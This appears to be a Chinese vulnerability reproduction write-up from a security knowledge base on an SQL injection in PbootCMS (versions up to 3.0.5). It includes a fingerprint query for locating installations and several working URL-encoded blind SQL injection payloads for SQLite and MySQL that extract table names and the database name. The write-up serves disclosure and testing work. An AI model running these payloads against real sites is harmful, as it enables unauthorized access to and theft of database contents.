# PbootCMS domain SQL注入漏洞

## 漏洞描述

PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>PbootCMS <= 3.0.5</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="PBOOTCMS"</a-checkbox></br>

## 漏洞复现

本地搭建好最新版本,访问首页

![img](../../../.vuepress/public/img/1629446682012-1df0a2c6-c764-4f1f-a5ae-cb85fd927b7e.png)

我们需要访问一个存在的页面

url中13后加个单引号 '

![img](../../../.vuepress/public/img/1629446712199-bb42a36a-69b2-485a-b0e6-0512f775cf45.png)

若为执行sql报错相关,则漏洞存在

若显示下图

![img](../../../.vuepress/public/img/1629446812952-1dc35ab3-7379-424b-aad0-f8ad0629361c.png)

则漏洞无法利用

程序默认搭建为sqlite3数据库, Fuzz当前数据库表单payload

```plain
')%0aand%0a(SELECT%0acount(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d'ta ble'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%')<40--
```

![img](../../../.vuepress/public/img/1629447097101-67648843-6711-4cbc-a2f2-dfa5f6aaa6f9.png)

通过此payload进行盲注Fuzz数据库中表单总数是否小于40

查询为真返回正常,假则报错

![img](../../../.vuepress/public/img/1629447283665-e890ddac-0cea-4447-a0ff-d42578145f93.png)

由此我们可以准确推断出表单总数

计算sqlite数据库中第一个表名长度,我们可以使用如下payload:

```plain
')%0aand%0a(SELECT%0alength(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d't able'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a1%0aoffset%0a0)<8--
```

![img](../../../.vuepress/public/img/1629447585595-c411c868-fcff-4361-8a84-84596245407a.png)

猜解第一个表名称,我们可以使用如下payload:

```plain
')%0aand%0a(SELECT%0asubstr(tbl_name,1,1)%0aFROM%0asqlite_master%0aWHERE%0atype% 3d'table'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a1%0aoffset%0a0)%3d'a'--
```

![img](../../../.vuepress/public/img/1629447665612-0b0fe39d-b896-41d9-9904-cf760f2b516c.png)

这样可以得到数据库第一个表的第一位数值为字符串"a"

通过substr()函数,我们可以很轻松的得到表名称.

同理可获取其他数据

#### 在Mysql下的利用方式

猜解当前数据库名称 可以使用如下payload进行Fuzz:

```plain
')%0aand%0a(select%0asubstr(database(),1,1)%3d'p')%23
```

查询为真时页面将返回正常.

使用Burpsuite可以爆破出数据库名称,其他表名字段名等方法相同

<a-alert type="success" message="(附: https://github.com/Catw0rld/vulner/issues/1)" description="" showIcon>
</a-alert>
<br/>